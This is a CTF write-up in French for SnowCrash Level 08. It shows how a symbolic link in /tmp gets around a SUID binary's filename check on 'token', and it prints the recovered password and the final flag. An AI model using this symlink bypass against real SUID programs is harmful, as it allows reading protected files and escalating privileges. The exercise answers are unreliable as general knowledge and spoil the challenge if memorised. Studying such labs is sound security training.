# Level 08 - Solution

## Introduction
Ce niveau exploite une vulnérabilité de **Path Traversal via Symbolic Link** dans un binaire SUID qui filtre le nom de fichier mais pas le chemin réel.

## Étape 1 : Découverte des fichiers

On dispose de deux fichiers dans le répertoire home :
- `level08` : Un binaire SUID
- `token` : Un fichier avec des permissions restreintes (Permission denied)

```bash
level08@SnowCrash:~$ ls -la
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

Tentative de lecture directe :
```bash
level08@SnowCrash:~$ cat token
cat: token: Permission denied
```

## Étape 2 : Décompilation et analyse du binaire

### Décompiler avec Dogbolt

Utiliser [Dogbolt](https://dogbolt.org) pour décompiler le binaire `level08`.


## Étape 3 : Analyse de la vulnérabilité

### 🔍 Comportement du binaire

Le binaire :
1. Prend un nom de fichier en argument
2. **Vérifie si le nom contient la chaîne "token"**
3. Si "token" est trouvé → erreur
4. Sinon → lit et affiche le contenu du fichier

### Problème de sécurité

La vérification utilise `strstr(filename, "token")` qui ne vérifie que le **nom du chemin**, pas le **fichier réel pointé** !
strstr("token", "token")                                                                                                     = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'

## Étape 4 : Exploitation - Symbolic Link Bypass

### Créer un lien symbolique

Créer un lien symbolique vers `token` avec un nom qui ne contient pas "token" :

```bash
level08@SnowCrash:~$ ln -s ~/token /tmp/flag
```

ou

```bash
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/myfile
```

### Exécuter le binaire avec le lien symbolique

```bash
level08@SnowCrash:~$ ./level08 /tmp/flag
quif5eloekouj29ke0vouxean
```

Le binaire lit `/tmp/flag`, qui pointe vers `token`, et affiche son contenu !

## Étape 5 : Récupération du flag

Utiliser le token pour se connecter en tant que `flag08` :

```bash
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
```

Exécuter `getflag` :
```bash
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

## Résultat

**Flag** : `25749xKZ8L7DkSCwJkT9dyv6f`
